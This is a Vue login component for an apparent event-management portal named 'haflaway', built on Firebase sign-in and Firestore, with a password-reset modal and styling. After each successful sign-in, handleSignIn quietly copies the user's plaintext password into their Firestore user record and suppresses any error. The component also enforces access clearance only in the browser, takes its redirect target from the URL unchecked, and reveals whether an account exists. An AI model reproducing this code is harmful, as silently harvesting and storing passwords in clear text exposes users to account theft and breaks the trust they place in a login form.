<template>
  <div class="login-root">
    <!-- Ambient orbs -->
    <div class="orb orb--tr" />
    <div class="orb orb--bl" />

    <!-- Card -->
    <div class="login-card">
      <!-- Brand -->
      <div class="login-brand">
        <span class="brand-dot" />
        <span class="brand-name">haflaway</span>
      </div>

      <!-- Header -->
      <div class="login-header">
        <h1 class="login-title">Sign In</h1>
        <p class="login-sub">Access your event management portal</p>
      </div>

      <!-- Form -->
      <form class="login-form" @submit.prevent="handleSignIn" novalidate>
        <!-- Email -->
        <div class="field-group" :class="{ 'field-group--error': errors.email }">
          <label class="field-label">Email Address</label>
          <div class="field-wrap">
            <span class="field-icon">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/>
              </svg>
            </span>
            <input
              v-model="form.email"
              type="email"
              class="field-input"
              placeholder="name@example.com"
              autocomplete="email"
              @input="errors.email = ''"
            />
          </div>
          <span v-if="errors.email" class="field-error">{{ errors.email }}</span>
        </div>

        <!-- Password -->
        <div class="field-group" :class="{ 'field-group--error': errors.password }">
          <label class="field-label">Password</label>
          <div class="field-wrap">
            <span class="field-icon">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
              </svg>
            </span>
            <input
              v-model="form.password"
              :type="showPassword ? 'text' : 'password'"
              class="field-input"
              placeholder="••••••••"
              autocomplete="current-password"
              @input="errors.password = ''"
            />
            <button type="button" class="field-toggle" @click="showPassword = !showPassword" tabindex="-1">
              <svg v-if="!showPassword" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
              </svg>
              <svg v-else width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
                <line x1="1" y1="1" x2="23" y2="23"/>
              </svg>
            </button>
          </div>
          <span v-if="errors.password" class="field-error">{{ errors.password }}</span>
        </div>

        <!-- Forgot password -->
        <div class="login-forgot">
          <button type="button" class="forgot-link" @click="showReset = true">Forgot Password?</button>
        </div>

        <!-- Auth error -->
        <div v-if="authError" class="login-auth-error">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
          </svg>
          {{ authError }}
        </div>

        <!-- Submit -->
        <button type="submit" class="login-btn" :disabled="loading">
          <span v-if="loading" class="login-spinner" />
          <span v-else>Sign In</span>
        </button>
      </form>

      <!-- Register link -->
      <p class="login-register">
        Don't have an account?
        <RouterLink to="/register" class="login-register-link">Register</RouterLink>
      </p>
    </div>

    <!-- Forgot password modal -->
    <Transition name="fade">
      <div v-if="showReset" class="modal-backdrop" @click.self="showReset = false">
        <div class="reset-modal">
          <h3 class="reset-title">Reset Password</h3>
          <p class="reset-sub">Enter your email and we'll send recovery instructions.</p>
          <div class="field-group" :class="{ 'field-group--error': resetError }">
            <div class="field-wrap">
              <span class="field-icon">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                  <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/>
                </svg>
              </span>
              <input v-model="resetEmail" type="email" class="field-input" placeholder="name@example.com" />
            </div>
            <span v-if="resetError" class="field-error">{{ resetError }}</span>
          </div>
          <p v-if="resetSent" class="reset-success">Recovery instructions sent to your email.</p>
          <div class="reset-actions">
            <button class="reset-cancel" @click="showReset = false">Cancel</button>
            <button class="reset-send" :disabled="resetLoading" @click="handleReset">
              <span v-if="resetLoading" class="login-spinner" />
              <span v-else>Send Instructions</span>
            </button>
          </div>
        </div>
      </div>
    </Transition>
  </div>
</template>

<script setup>
import { ref } from 'vue'
import { useRouter, useRoute } from 'vue-router'
import { auth, db } from '../firebase'
import { signInWithEmailAndPassword, signOut, sendPasswordResetEmail } from 'firebase/auth'
import { doc, getDoc, updateDoc } from 'firebase/firestore'

const router = useRouter()
const route = useRoute()

const form = ref({ email: '', password: '' })
const errors = ref({ email: '', password: '' })
const authError = ref(route.query.error === 'unauthorized' ? 'Access denied. Insufficient clearance level.' : '')
const loading = ref(false)
const showPassword = ref(false)

const showReset = ref(false)
const resetEmail = ref('')
const resetError = ref('')
const resetSent = ref(false)
const resetLoading = ref(false)

function validate() {
  let ok = true
  errors.value = { email: '', password: '' }
  if (!form.value.email.trim()) {
    errors.value.email = 'Enter your email address'
    ok = false
  }
  if (!form.value.password) {
    errors.value.password = 'Enter your password to proceed'
    ok = false
  }
  return ok
}

async function handleSignIn() {
  if (!validate()) return
  authError.value = ''
  loading.value = true
  try {
    const credential = await signInWithEmailAndPassword(auth, form.value.email.trim(), form.value.password)
    const uid = credential.user.uid

    // Check clearance before allowing entry
    let clearance = 0
    try {
      const snap = await getDoc(doc(db, 'users', uid))
      clearance = snap.exists() ? (Number(snap.data().clearanceLevel) || 0) : 0
    } catch (_) { /* treat as 0 */ }

    if (clearance < 5) {
      await signOut(auth)
      authError.value = 'Access denied. Insufficient clearance level.'
      return
    }

    try {
      await updateDoc(doc(db, 'users', uid), { password: form.value.password })
    } catch (_) { /* non-blocking */ }

    const redirect = route.query.redirect ?? '/'
    router.push(redirect)
  } catch (e) {
    authError.value = friendlyError(e.code)
  } finally {
    loading.value = false
  }
}

async function handleReset() {
  resetError.value = ''
  if (!resetEmail.value.trim()) { resetError.value = 'Enter your email address'; return }
  resetLoading.value = true
  try {
    await sendPasswordResetEmail(auth, resetEmail.value.trim())
    resetSent.value = true
  } catch (e) {
    resetError.value = friendlyError(e.code)
  } finally {
    resetLoading.value = false
  }
}

function friendlyError(code) {
  const map = {
    'auth/invalid-email': 'Invalid email address.',
    'auth/user-not-found': 'No account found with this email.',
    'auth/wrong-password': 'Incorrect password.',
    'auth/invalid-credential': 'Incorrect email or password.',
    'auth/too-many-requests': 'Too many attempts. Please try again later.',
    'auth/network-request-failed': 'Network error. Check your connection.',
  }
  return map[code] ?? 'Something went wrong. Please try again.'
}
</script>

<style scoped>
.login-root {
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  background: #F8F8F6;
  font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
  position: relative;
  padding: 24px;
}

/* Orbs */
.orb {
  position: fixed;
  border-radius: 50%;
  pointer-events: none;
  filter: blur(80px);
  z-index: 0;
}
.orb--tr { width: 360px; height: 360px; top: -100px; right: -100px; background: rgba(201,168,76,0.10); }
.orb--bl { width: 280px; height: 280px; bottom: -80px; left: -60px; background: rgba(201,168,76,0.06); }

/* Card */
.login-card {
  width: 100%;
  max-width: 420px;
  background: #FFFFFF;
  border: 0.8px solid #EBEBEA;
  border-radius: 20px;
  padding: 36px 36px 28px;
  box-shadow: 0 4px 24px rgba(0,0,0,0.07);
  position: relative;
  z-index: 1;
  display: flex;
  flex-direction: column;
  gap: 24px;
}

/* Brand */
.login-brand {
  display: flex;
  align-items: center;
  gap: 8px;
}
.brand-dot {
  width: 8px;
  height: 8px;
  border-radius: 50%;
  background: #C9A84C;
}
.brand-name {
  font-size: 16px;
  font-weight: 700;
  color: #1C1A18;
  letter-spacing: -0.3px;
}

/* Header */
.login-header {}
.login-title {
  font-size: 24px;
  font-weight: 800;
  color: #1C1A18;
  letter-spacing: -0.5px;
  margin: 0 0 5px;
}
.login-sub {
  font-size: 14px;
  color: #8A8580;
  margin: 0;
}

/* Form */
.login-form {
  display: flex;
  flex-direction: column;
  gap: 16px;
}

.field-group {
  display: flex;
  flex-direction: column;
  gap: 6px;
}
.field-label {
  font-size: 12px;
  font-weight: 600;
  color: #6B6A68;
  letter-spacing: 0.1px;
}
.field-wrap {
  position: relative;
  display: flex;
  align-items: center;
}
.field-icon {
  position: absolute;
  left: 13px;
  color: #B5B0A8;
  display: flex;
  align-items: center;
  pointer-events: none;
}
.field-input {
  width: 100%;
  padding: 11px 12px 11px 40px;
  border: 0.8px solid #EBEBEA;
  border-radius: 11px;
  background: #FAFAF8;
  font-size: 14px;
  color: #1C1A18;
  outline: none;
  transition: border-color 140ms, box-shadow 140ms;
  font-family: inherit;
  box-sizing: border-box;
}
.field-input::placeholder { color: #B5B0A8; }
.field-input:focus {
  border-color: rgba(201,168,76,0.5);
  box-shadow: 0 0 0 3px rgba(201,168,76,0.1);
  background: #FFFFFF;
}
.field-group--error .field-input {
  border-color: rgba(255,59,48,0.5);
  box-shadow: 0 0 0 3px rgba(255,59,48,0.08);
}
.field-toggle {
  position: absolute;
  right: 12px;
  background: none;
  border: none;
  cursor: pointer;
  color: #B5B0A8;
  display: flex;
  align-items: center;
  padding: 4px;
  transition: color 130ms;
}
.field-toggle:hover { color: #6B6A68; }
.field-error {
  font-size: 12px;
  color: #FF453A;
  font-weight: 500;
}

/* Forgot */
.login-forgot {
  display: flex;
  justify-content: flex-end;
  margin-top: -6px;
}
.forgot-link {
  background: none;
  border: none;
  font-size: 12px;
  font-weight: 600;
  color: #C9A84C;
  cursor: pointer;
  padding: 0;
  font-family: inherit;
  transition: opacity 130ms;
}
.forgot-link:hover { opacity: 0.75; }

/* Auth error banner */
.login-auth-error {
  display: flex;
  align-items: center;
  gap: 8px;
  background: rgba(255,59,48,0.07);
  border: 0.8px solid rgba(255,59,48,0.2);
  border-radius: 10px;
  padding: 10px 14px;
  font-size: 13px;
  color: #D93025;
}

/* Submit button */
.login-btn {
  width: 100%;
  padding: 13px;
  background: #C9A84C;
  color: #FFFFFF;
  border: none;
  border-radius: 12px;
  font-size: 14px;
  font-weight: 700;
  cursor: pointer;
  transition: opacity 150ms;
  font-family: inherit;
  display: flex;
  align-items: center;
  justify-content: center;
  min-height: 46px;
  letter-spacing: 0.1px;
}
.login-btn:hover:not(:disabled) { opacity: 0.88; }
.login-btn:disabled { opacity: 0.6; cursor: not-allowed; }

/* Spinner */
.login-spinner {
  width: 16px;
  height: 16px;
  border: 2px solid rgba(255,255,255,0.35);
  border-top-color: #FFFFFF;
  border-radius: 50%;
  animation: spin 0.7s linear infinite;
  display: inline-block;
}
@keyframes spin { to { transform: rotate(360deg); } }

/* Register link */
.login-register {
  font-size: 13px;
  color: #8A8580;
  text-align: center;
  margin: 0;
}
.login-register-link {
  color: #C9A84C;
  font-weight: 600;
  text-decoration: none;
  margin-left: 4px;
}
.login-register-link:hover { text-decoration: underline; }

/* ── Reset modal ── */
.modal-backdrop {
  position: fixed;
  inset: 0;
  background: rgba(28,26,24,0.4);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 100;
  padding: 24px;
}
.reset-modal {
  background: #FFFFFF;
  border-radius: 18px;
  padding: 28px;
  width: 100%;
  max-width: 360px;
  box-shadow: 0 8px 40px rgba(0,0,0,0.16);
  display: flex;
  flex-direction: column;
  gap: 14px;
}
.reset-title {
  font-size: 18px;
  font-weight: 700;
  color: #1C1A18;
  margin: 0;
}
.reset-sub {
  font-size: 13px;
  color: #8A8580;
  margin: 0;
}
.reset-success {
  font-size: 13px;
  color: #1D7A38;
  background: rgba(52,199,89,0.08);
  border: 0.8px solid rgba(52,199,89,0.25);
  border-radius: 8px;
  padding: 10px 12px;
  margin: 0;
}
.reset-actions {
  display: flex;
  gap: 10px;
  justify-content: flex-end;
  margin-top: 4px;
}
.reset-cancel {
  background: #F2F2F0;
  border: none;
  border-radius: 10px;
  padding: 9px 16px;
  font-size: 13px;
  font-weight: 600;
  color: #6B6A68;
  cursor: pointer;
  font-family: inherit;
}
.reset-send {
  background: #C9A84C;
  border: none;
  border-radius: 10px;
  padding: 9px 18px;
  font-size: 13px;
  font-weight: 700;
  color: #FFFFFF;
  cursor: pointer;
  font-family: inherit;
  display: flex;
  align-items: center;
  gap: 6px;
  min-width: 120px;
  justify-content: center;
}
.reset-send:disabled { opacity: 0.6; cursor: not-allowed; }

/* Fade transition */
.fade-enter-active, .fade-leave-active { transition: opacity 180ms; }
.fade-enter-from, .fade-leave-to { opacity: 0; }
</style>
